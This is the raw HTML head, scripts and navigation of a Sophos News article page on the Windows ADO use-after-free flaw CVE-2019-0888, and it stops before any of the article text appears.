<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
	<link rel="alternate" hreflang="es-419" href="https://news.sophos.com/es-419/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="nl-nl" href="https://news.sophos.com/nl-nl/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="pt-br" href="https://news.sophos.com/pt-br/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="de-de" href="https://news.sophos.com/de-de/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="fr-fr" href="https://news.sophos.com/fr-fr/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="es-es" href="https://news.sophos.com/es-es/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="it-it" href="https://news.sophos.com/it-it/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="ja-jp" href="https://news.sophos.com/ja-jp/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
	<link rel="alternate" hreflang="zh-tw" href="https://news.sophos.com/zh-tw/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado" />
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO) &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO) Comments Feed" href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/feed/" />
<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.0.1"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??-eJyNj9EOwjAIRX/IDpeomQ/Gb+komSjtmsJi+vfOmSXbm48XOMCBd3acUKZACqgKgdWglxFfTrgvvlRQq0JN5NTMAwfYEk+FSIE9CUVKtgtZfKXihAaP9T987m3zDsIx2XJiclmmgZOCki/4ABKvxpgLrf9/RcpcNgouj2rqfkaLia5r7/HWXs5ddzq21+4DN6hjBg==' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<style id='global-styles-inline-css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='all-css-2' href='https://news.sophos.com/_static/??/wp-content/themes/sophosnews-2017/style-2021.css,/wp-content/mu-plugins/jetpack-11.1/css/jetpack.css?m=1658840194' type='text/css' media='all' />
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZqYWFkTmQyAIAr9AiMg==" ></script><link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/57686" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 6.0.1" />
<link rel="canonical" href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" />
<link rel='shortlink' href='https://news.sophos.com/?p=57686' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2019%2F07%2F09%2Fcve-2019-0888-use-after-free-in-windows-activex-data-objects-ado%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2019%2F07%2F09%2Fcve-2019-0888-use-after-free-in-windows-activex-data-objects-ado%2F&#038;format=xml" />
<style>img#wpstats{display:none}</style>
	<link rel="amphtml" href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)" />
<meta property="og:url" content="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" />
<meta property="og:description" content="Details of the vulnerability we reported to Microsoft and was fixed in last month&#8217;s Patch Tuesday" />
<meta property="article:published_time" content="2019-07-09T14:00:58+00:00" />
<meta property="article:modified_time" content="2019-07-10T02:15:15+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?w=170" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?w=170" />
<meta property="og:image:width" content="636" />
<meta property="og:image:height" content="576" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta property="fb:admins" content="28552295016" />
<meta name="twitter:text:title" content="CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?w=144" />
<meta name="twitter:card" content="summary" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-57686 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="sr-only" href="#content">Skip to content</a>

	
<header class="bg-blue-600" x-data="{ mobileMenu: false, searchField: false }">
	<div class="container">
		<div class="flex items-center justify-between h-16">

			<!-- Logo -->
			<div class="flex-shrink-0">
				<a class="site-logo" href="https://news.sophos.com/en-us/" rel="home">
				<svg width="172" height="17" xmlns="http://www.w3.org/2000/svg">
					<g fill="#FFF" fill-rule="evenodd">
						<path d="M113.024 5.298V16.74h-2.595V.259h2.265l7.997 11.49V.26h2.619v16.482h-2.289l-7.997-11.443M126.064.259h10.78v2.307H128.8v4.521h7.549v2.214h-7.55v5.133h8.376v2.307h-11.111V.259M138.478.259h2.855l2.694 12.29L147.29.26h2.783l3.61 12.314L156.005.26h2.783l-3.62 16.482h-2.76l-3.751-12.126-3.426 12.126h-2.784L138.478.259M168.933 4.968v-.283c0-1.318-.778-2.425-3.492-2.425-2.43 0-3.279 1.013-3.279 2.284 0 1.201.708 1.743 2.218 2.073l3.491.776c2.123.448 4.129 1.602 4.129 4.333 0 3.014-1.675 5.274-6.204 5.274-5.214 0-6.559-2.26-6.559-4.52v-.307h2.737v.26c0 1.2.755 2.284 3.774 2.284 2.5 0 3.421-1.084 3.421-2.638 0-1.224-.731-1.907-2.289-2.237l-3.49-.777c-2.407-.517-3.917-1.742-3.917-4.309 0-2.566 1.77-4.756 6.016-4.756 4.553 0 6.18 2.26 6.18 4.639v.33h-2.736M85.303 16.718h8.88c2.492 0 3.549-.15 4.379-.677 1.308-.803 2.139-2.378 2.139-4.162 0-1.457-.504-2.868-1.258-3.622-.981-1.006-2.316-1.382-4.783-1.382h-2.693c-1.208 0-2.097-.05-2.6-.276-.605-.277-.956-.81-.956-1.562 0-.88.427-1.455 1.132-1.632.529-.124 1.14-.124 2.726-.15h7.949V.265h-8.754c-1.963 0-2.843.075-3.598.353-1.737.602-2.921 2.383-2.921 4.518 0 1.458.58 2.745 1.587 3.624.881.753 2.189 1.105 4.202 1.105h3.584c.805 0 1.46.1 1.813.3.678.327 1.08.934 1.08 1.714 0 .652-.301 1.122-.83 1.447-.426.278-1.158.403-2.49.403h-8.588v2.99zm-84.945 0h8.88c2.492 0 3.549-.15 4.38-.677 1.307-.803 2.138-2.378 2.138-4.162 0-1.457-.504-2.868-1.258-3.622-.982-1.006-2.316-1.382-4.783-1.382H7.023c-1.209 0-2.098-.05-2.6-.276-.605-.277-.957-.81-.957-1.562 0-.88.427-1.455 1.132-1.632.53-.124 1.141-.124 2.726-.15h7.95V.265H6.52c-1.964 0-2.844.075-3.6.353C1.185 1.22 0 3 0 5.136 0 6.594.582 7.881 1.587 8.76c.881.753 2.19 1.105 4.203 1.105h3.582c.807 0 1.46.1 1.814.3.678.327 1.08.934 1.08 1.714 0 .652-.3 1.122-.83 1.447-.426.278-1.157.403-2.49.403H.358v2.99zM71.99 4.596c-.52.813-.765 2.118-.765 3.87 0 3.845 1.331 5.595 4.294 5.595 2.915 0 4.248-1.75 4.248-5.546 0-3.847-1.308-5.571-4.248-5.571-1.604 0-2.864.592-3.53 1.652zm10.05-1.897c1.013 1.33 1.58 3.498 1.58 6.039 0 2.882-.914 5.249-2.544 6.555-1.233.986-3.11 1.528-5.335 1.528-3.16 0-5.654-1.037-6.937-2.884-.964-1.355-1.435-3.155-1.435-5.35 0-3.152.866-5.544 2.495-6.826C71.149.726 73.175.158 75.497.158c2.938 0 5.284.913 6.543 2.54zM65.36.279h-3.507v6.73h-6.345V.278h-3.507v16.439h3.507V9.94h6.345v6.778h3.506V.278zM43.533 8.042c.938 0 1.48-.123 1.852-.469.442-.37.715-1.158.715-2.07 0-1.084-.443-1.872-1.208-2.144-.272-.1-.717-.149-1.286-.149h-4.839v4.832h4.766zm-4.766 8.674h-3.507V.278h8.223c2.889 0 3.902.295 4.988 1.504.964 1.036 1.481 2.39 1.481 3.845 0 1.725-.69 3.327-1.826 4.289-.962.813-1.854 1.058-3.728 1.058h-5.63v5.743zM21.665 4.596c-.519.813-.764 2.118-.764 3.87 0 3.845 1.333 5.595 4.297 5.595 2.913 0 4.247-1.75 4.247-5.546 0-3.847-1.308-5.571-4.247-5.571-1.606 0-2.866.592-3.533 1.652zm10.052-1.897c1.014 1.33 1.581 3.498 1.581 6.039 0 2.882-.914 5.249-2.545 6.555-1.233.986-3.11 1.528-5.333 1.528-3.162 0-5.656-1.037-6.94-2.884-.964-1.355-1.432-3.155-1.432-5.35 0-3.152.865-5.544 2.496-6.826C20.825.726 22.85.158 25.173.158c2.938 0 5.286.913 6.544 2.54z"/>
					</g>
				</svg>
				</a>
			</div>

			<!-- Search Field -->
			<div class="lg:flex justify-end flex-grow hidden" x-show="searchField" x-cloak>
				<div class="relative w-1/2 rounded-md shadow-sm">
					<form role="search" method="get" action="https://news.sophos.com/en-us/">
						<input
							type="text"
							class="block w-full text-lg text-white placeholder-gray-100 bg-blue-800 border-0 rounded-md font-sansMedium font-medium"
							placeholder="Type to Search News"
							x-ref="searchInput"
							name="s"
						/>
						<div class="absolute inset-y-0 right-0 flex items-center px-3">
							<button
								class="hover:opacity-100 opacity-60 p-1 text-xs text-white uppercase rounded-full cursor-pointer"
								type="submit"
							>
								Search							</button>
						</div>
					</form>
				</div>
			</div>

			<!-- Main Nav -->
			<div class="lg:flex items-center flex-grow hidden" x-show="!searchField" x-cloak>
				<div class="flex ml-auto">
				<ul id="menu-en-us-primary" class="primary-menu"><li id="menu-item-77773" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li id="menu-item-77772" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li id="menu-item-77774" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-85326" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-77776" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-77776"><a href="https://nakedsecurity.sophos.com">Security News<div class="menu-item-description"></div></a></li>
<li id="menu-item-83702" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>				</div>
			</div>

			<!-- Search button -->
			<div class="lg:block hidden ml-4">
				<div class="flex items-center">
					<button
					class="border-2 border-transparent hover:border-white inline-flex items-center justify-center p-2 text-white rounded-md focus:outline-none transition-colors"
					@click.prevent="searchField = !searchField; $nextTick(() => { setTimeout(() => { $refs.searchInput.focus(); }, 150);});"
					>
						<span class="sr-only">Search</span>
						<!-- Heroicon name: outline/bell -->
						<svg
							class="w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							:class="{ 'block': !searchField, 'hidden': searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
							/>
						</svg>
						<svg
							class="hidden w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							aria-hidden="true"
							:class="{ 'block': searchField, 'hidden': !searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M6 18L18 6M6 6l12 12"
							/>
						</svg>
					</button>
				</div>
			</div>

			<!-- Mobile menu button -->
			<div class="lg:hidden flex -mr-2">
				<button
					type="button"
					class="hover:text-white hover:bg-blue-800 focus:outline-none hover:ring-2 focus:ring-offset-2 focus:ring-offset-gray-300 focus:ring-white inline-flex items-center justify-center p-2 text-white rounded-md"
					aria-controls="mobile-menu"
					aria-expanded="false"
					@click="mobileMenu = !mobileMenu"
				>
					<span class="sr-only">Open main menu</span>
					<!--
						Heroicon name: outline/menu

						Menu open: "hidden", Menu closed: "block"
					-->
					<svg
					class="block w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					:class="{ 'block': !mobileMenu, 'hidden': mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M4 6h16M4 12h16m-7 6h7"
					/>
					</svg>
					<!--
						Heroicon name: outline/x

						Menu open: "block", Menu closed: "hidden"
					-->
					<svg
					class="hidden w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					aria-hidden="true"
					:class="{ 'block': mobileMenu, 'hidden': !mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M6 18L18 6M6 6l12 12"
					/>
					</svg>
				</button>
			</div>
		</div>
	</div>

	<!-- Mobile menu, show/hide based on menu state. -->
	<div
	class="lg:hidden container"
	x-show="mobileMenu"
	x-cloak
	x-transition:enter="transition-all ease-out duration-100"
	x-transition:enter-start="transform opacity-0 scale-95"
	x-transition:enter-end="transform opacity-100 scale-100"
	x-transition:leave="transition ease-in duration-75"
	x-transition:leave-start="transform opacity-100 scale-100"
	x-transition:leave-end="transform opacity-0 scale-95"
	>
		<div class="pt-2 pb-8 space-y-2">
			<div class="relative rounded-md shadow-sm">
				<form role="search" method="get" action="https://news.sophos.com/en-us/">
					<input
						type="text"
						class="focus:ring-blue-600 focus:border-blue-600 sm:text-sm block w-full placeholder-gray-600 border-gray-300 rounded-md"
						placeholder="Search News"
						name="s"
					/>
					<div
						class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none"
					>
						<button class="p-1 text-gray-500 rounded-full" type="submit">
							<span class="sr-only">Search</span>
							<!-- Heroicon name: outline/bell -->
							<svg
								class="w-4 h-4"
								xmlns="http://www.w3.org/2000/svg"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor"
							>
								<path
									stroke-linecap="round"
									stroke-linejoin="round"
									stroke-width="3"
									d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
								/>
							</svg>
						</button>
					</div>
				</form>
			</div>

			<ul id="menu-en-us-primary-1" class="mobile-menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-77776"><a href="https://nakedsecurity.sophos.com">Security News<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>		</div>
	</div>
</header>

	<div id="content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-57686" class="post-57686 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-ado tag-cve-2019-0888 tag-exploit tag-use-after-free tag-vbscript tag-vulnerability tag-windows region-en-us">

		<div class="md:mt-16 container mt-8">
		<div class="relative max-w-5xl mx-auto">
				<div
